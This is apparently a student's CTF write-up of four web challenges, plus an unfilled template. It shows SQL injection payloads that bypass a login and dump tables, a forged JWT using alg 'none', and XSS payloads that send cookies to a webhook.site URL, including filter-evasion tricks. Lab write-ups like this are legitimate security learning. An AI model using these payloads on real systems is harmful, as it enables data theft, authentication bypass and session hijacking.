# 1. Database Incursion V2

> Directly access the challenge server at https://database-incursion-v2.nitephase.live/

## Solution:

- First opened it up and realised it is similar to citadel CTF's challenge
- So I first bypasses login using `' OR 1=1--`
- Now that I was on database page I could read employ names and notes
- One of them talked about management team (similar to citadel CTF)
<img width="2294" height="1505" alt="image" src="https://github.com/user-attachments/assets/c4c551c3-b627-4d4e-ba9a-7574b1226212" />

- So I entered `' OR Department='Management'--` into the query box
- Now one of them hinted to ask Kiwi, so I entered `' OR Name='Kiwi'--`
- Same as citadel ctf it was limited to 4 rows so there must be one more kiwi, thus I did `' OR ID='14'--`
- It had password in notes, so I entered `ecSKsN7SES` in admin panel
- Now the next part was pretty new, I searched up more about SQL injection online and found kind of a guidebook/cheatsheet
- I looked into this documentation a bit and found to mess with multiple tables and display them or use query of one table to view another I should use `UNION` with specific syntax
- Also the metadata thing had `REDADCTED` below, which was pretty obvioously the main thing we need to find for flag
<img width="2244" height="660" alt="image" src="https://github.com/user-attachments/assets/840c4bc3-3a70-4def-83e7-60f9f1d3c46a" />

- So I read descriptions and realised I need to call metadata table to view this
- First I entered `' UNION SELECT 1, sql, 3, 4 FROM sqlite_master WHERE tbl_name='metadata'--` and this gave me: `CREATE TABLE metadata ( id INTEGER PRIMARY KEY AUTOINCREMENT, table_name TEXT, description TEXT, columns TEXT )`
- Now we know the column name inside metadata is `table_name`, so we can use `' UNION SELECT 1, table_name, 3, 4 FROM metadata--`
- This gave me the actual name of redacted, i.e `CITADEL_ARCHIVE_2077`
- Now we need to do similar thing for `CITADEL_ARCHIVE_2077`, so I entered `' UNION SELECT 1, sql, 3, 4 FROM sqlite_master WHERE tbl_name='CITADEL_ARCHIVE_2077'--`
- I got the column name next to TEXT as `secrets`
- So I simply did `' UNION SELECT 1, secrets, 3, 4 FROM CITADEL_ARCHIVE_2077--`
- This gave me the flag!!!


## Flag:

```
CITADEL{571ll_d0n7_kn0w_1f_175_53qu3l_0r_5ql?}
```

## Concepts learnt:

- I got to learn a lot more about SQL injection
- `UNION` was a new thing I learnt about
- Also learnt more about sql_master and how to figure stuff from columns and finding them

## Notes:

- Wasted crazy amount of time cause I was doing something wrong in first step i.e bypassing login
- We can use alternative methods for kiwi step, but I remember what I did in citadel ctf so I just did that

## Resources:

- SQL injection guide: https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet


***


# 2. Temporal Token

> I made my own website with custom auth, but why can't i login with my credentials? ``` Username: Belegar Password: Ironhammer ``` Directly access the challenge server at https://temporal-token.nitephase.live

## Solution:

- First I went to website and did a dummy login and it gave invalid credentials error
- Then I tried given password and username, that did give me succeed but still didn't let me in as challenge description said
```
{
  "status": 200,
  "body": {
    "success": true
  },
  "afterCheck": {
    "status": 401,
    "body": {
      "error": "Token expired"
    }
  }
}
```
- So I tried to go to cookies and got `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJCZWxlZ2FyIiwiZXhwIjowfQ.L4UuI63oMzkmh4clZMZPoANwNxnjiYTtZO90IBhQ8B8`
- Now I decoded this with base64 decoder but got broken output `{"alg":"HS256","typ":"JWT"}{"sub":"Belegar","exp":0}R:Þƒ3hxrVLdï¿½7q8NNB`
<img width="1275" height="706" alt="msedge_QyEpPfDbDY" src="https://github.com/user-attachments/assets/e6056986-098d-4d85-a5d1-6d37529baf63" />

- Now I was aware it is a JWT
- So I searched more about it and found out I can change values on `jwt.io`
- I went there and decoded it properly, and decided to change exp time
- So I went to epoch time website, then increased it to one year from now on and decoded it that way
- I went to cookies and replaced it but it didn't work, later I realised it is HS256 so I need a valid signature
- I installed `jwt-cracker` using npm and used that with `rockyou.txt` but this didn't work
- Searched around more and realised I can try changing `alg` to `none` and if website has poor security it will just think that token is valid
- I put the final `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJCZWxlZ2FyIiwiZXhwIjoxNzk2MDQ3ODkxfQ.` token
- This worked and gave me the flag
<img width="888" height="1285" alt="image" src="https://github.com/user-attachments/assets/ab2e8efa-82ce-4d46-97ce-7efe9a898131" />


## Flag:

```
nite{50_y0u_kn0w_h0w_jw75_w0rk_n0w?}
```

## Concepts learnt:

- I learn how to mess with JWT tokens
- I also found about different parts of it and how to change header or content
- Got an idea on how to exploit poorly secured websites

## Notes:

- I spent quite some time on cracking a valid signature to change expiry time and exploit it

## Resources:

- Base64 decoder: https://www.base64decode.org/
- JWT decoder/encoder: https://www.jwt.io/
- Epoch time convertor: https://www.epochconverter.com/
- [Handbook](https://medium.com/@shoaibbinrashid11/jwt-hacking-handbook-from-ctfs-to-real-world-pentesting-eb8850a4e833) for JWT exploits and basic idea (pretty sure this is written by AI lol, but was useful nevertheless)

***

# 3. Oneshot

> Directly access the challenge server at https://pacman-git-master-mrrobot404s-projects.vercel.app

## Solution:

- First I downloaded the source python file and opened the website
- I analyzed the file and understoon that this requires SQL injection but in a different way than I am used to from previous challenges
- I further understood the code and figured that I am given a random tableID and supposed to search the password but I can only search once so I can only search one character, thus we can exploit this using SQLi to bundle up requests and exploit the database
- So first I found out my table ID by finding the hidden string in element
<img width="1969" height="714" alt="image" src="https://github.com/user-attachments/assets/fcb074e5-5655-45ac-9531-05cbb96c0e11" />

- To do this particular SQL injection we can use `UNION` and input a large command: `' AND 0 UNION ALL SELECT substr(password,1,1) FROM table_b06422c739c0b4db UNION ALL SELECT substr(password,2,1) FROM table_b06422c739c0b4db UNION ALL SELECT substr(password,3,1) FROM table_b06422c739c0b4db UNION ALL SELECT substr(password,4,1) FROM table_b06422c739c0b4db UNION ALL SELECT substr(password,5,1) FROM table_b06422c739c0b4db UNION ALL SELECT substr(password,6,1) FROM table_b06422c739c0b4db UNION ALL SELECT substr(password,7,1) FROM table_b06422c739c0b4db UNION ALL SELECT substr(password,8,1) FROM table_b06422c739c0b4db UNION ALL SELECT substr(password,9,1) FROM table_b06422c739c0b4db UNION ALL SELECT substr(password,10,1) FROM table_b06422c739c0b4db UNION ALL SELECT substr(password,11,1) FROM table_b06422c739c0b4db UNION ALL SELECT substr(password,12,1) FROM table_b06422c739c0b4db UNION ALL SELECT substr(password,13,1) FROM table_b06422c739c0b4db UNION ALL SELECT substr(password,14,1) FROM table_b06422c739c0b4db UNION ALL SELECT substr(password,15,1) FROM table_b06422c739c0b4db UNION ALL SELECT substr(password,16,1) FROM table_b06422c739c0b4db UNION ALL SELECT substr(password,17,1) FROM table_b06422c739c0b4db UNION ALL SELECT substr(password,18,1) FROM table_b06422c739c0b4db UNION ALL SELECT substr(password,19,1) FROM table_b06422c739c0b4db UNION ALL SELECT substr(password,20,1) FROM table_b06422c739c0b4db UNION ALL SELECT substr(password,21,1) FROM table_b06422c739c0b4db UNION ALL SELECT substr(password,22,1) FROM table_b06422c739c0b4db UNION ALL SELECT substr(password,23,1) FROM table_b06422c739c0b4db UNION ALL SELECT substr(password,24,1) FROM table_b06422c739c0b4db UNION ALL SELECT substr(password,25,1) FROM table_b06422c739c0b4db UNION ALL SELECT substr(password,26,1) FROM table_b06422c739c0b4db UNION ALL SELECT substr(password,27,1) FROM table_b06422c739c0b4db UNION ALL SELECT substr(password,28,1) FROM table_b06422c739c0b4db UNION ALL SELECT substr(password,29,1) FROM table_b06422c739c0b4db UNION ALL SELECT substr(password,30,1) FROM table_b06422c739c0b4db UNION ALL SELECT substr(password,31,1) FROM table_b06422c739c0b4db UNION ALL SELECT substr(password,32,1) FROM table_b06422c739c0b4db --`
- Now this searches all the characters and gives us each character
<img width="387" height="1099" alt="image" src="https://github.com/user-attachments/assets/36f12125-625c-4f23-a9d5-693b8c46e245" />

- After putting this together we can input `7c0f829454938efd9a3baa6f658b37bb` in `Guess` input box and get the flag

## Flag:

```
nite{are_you_feeling_the_heat_now :)}
```

## Concepts learnt:

- I learnt more about SQL injection
- I also learnt how we can exploit search functions like this and bundle up more requests

## Notes:

- We can also sovle this using a recursive python script but my skills are hella weak to come up with that myself, so I resorted to using the huge manual command

## Resources:

- SQL injection guide: https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet


***

# 4. Challenge name

> Put in the challenge's description here

## Solution:

- Include as many steps as you can with your thought process
- You **must** include images such as screenshots wherever relevant.

```
put codes & terminal outputs here using triple backticks

you may also use ```python for python codes for example
```

## Flag:

```
picoCTF{}
```

## Concepts learnt:

- Include the new topics you've come across and explain them in brief
- 

## Notes:

- Include any alternate tangents you went on while solving the challenge, including mistakes & other solutions you found.
- 

## Resources:

- Include the resources you've referred to with links. [example hyperlink](https://google.com)


***

# 5. Why is it not called css

> After solving locally, access the challenge server at http://whyisitnotcalledcss.nitephase.live:56743

## Solution:

- The title made it clear it is XSS (cross site scripting) cause of the reference that it isn't called CSS and called XSS instead lol
- Now that I knew this, I went to guide sites given in PDF and tried to learn more about XSS
- Then I looked through source code and realised it has filters, which will be used in 2nd and 3rd part
- The first part had no filters so I can just use a basic payload
- I opened terminal and started my docker instance in its directory using `docker compose up -d --build`
- Then went to my local ip with port 56743 (also did again in official website using same payloads)
- So the xss exploit in this was reflected XSS and it basically uses parameters in url to execute stuff, it also showed me a preview where the bot would go if I enter a payload
- We need a webhook, which will kind of act like a listener and interscept the response to show us output of our payload, so I decided to use webhook.site and used the url in my payload
- For first payload I entered:
```
<script>
  window.location='https://webhook.site/91eb2855-8e81-4706-887c-5143e2d36666/?cookie=' + document.cookie;
</script>
```
- Then I got parameter `bf2a73106a3a6328746782b8b47e4bd350e` (docker) and `bf2a73106a3aa48bab9b8b47e4bd350e` (official instance) and added it behind the website
- For second part the filters were `return payload.lower().replace("script", "").replace("img", "").replace("svg", "")`
- To bypass this we can enter `scrscriptipt` and it will make it `script`
- So for second one we can use payload:
```
<scrscriptipt>
window.location='https://webhook.site/91eb2855-8e81-4706-887c-5143e2d36666/?cookie='+document.cookie
</scrscriptipt>
```
- This will give us parameters: `3e79c8a642j4hh2hbb7832384f043` (docker) and `3e79c8a64bd10f5fa897b7832384f043` which I will put behind url for 3rd part
- Third part had filters
```
def filter_3(payload):
    if "://" in payload.lower():
return "Nope"
    if "document" in payload.lower():
return "Nope"
    if "cookie" in payload.lower():
return "Nope"
    return payload.lower().replace("script", "").replace("img", "").replace("svg", "")
```
- So for third part we will have to use mix of `+` in javascript syntax and unicode to bypass the filter
- Thus we can use payload:
```
<scrscriptipt>
window.location='https:'+'/'+'/webhook.site/91eb2855-8e81-4706-887c-5143e2d36666/?c='+window['\u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074']['\u0063\u006f\u006f\u006b\u0069\u0065']
</scrscriptipt>
```
- This gives us the flag!!


## Flag:

```
nite{b3c4u53_c45c4d1n6_57yl3_5h3375_4lr34dy_3x1575}
```

## Concepts learnt:

- I learnt basics of XSS exploitation
- I also learnt about different HTML tags and how I can trick filters to abuse them

## Notes:

- At first it was very confusing because I have never done XSS exploitation
- Then I learnt through guides, understood basics of it and found different methods to exploit it
- We can probably also use img and onerror together to exploit this
- Third part was hella confusing because I first tried url parameter for `://` and unicode for `document.cookie` but it converted url parameter to further more parameters when passing to bot, then I tried to use direct url parameter myself but it kept flagging in filter and didn't work, so at the end I made seperate parts and added using `+`

## Resources:

- [XSS Guide](https://book.hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/index.html) given in PDF
- Basic attack vectors for XSS: https://www.invicti.com/learn/cross-site-scripting-xss
- [Webhook.site](https://webhook.site)
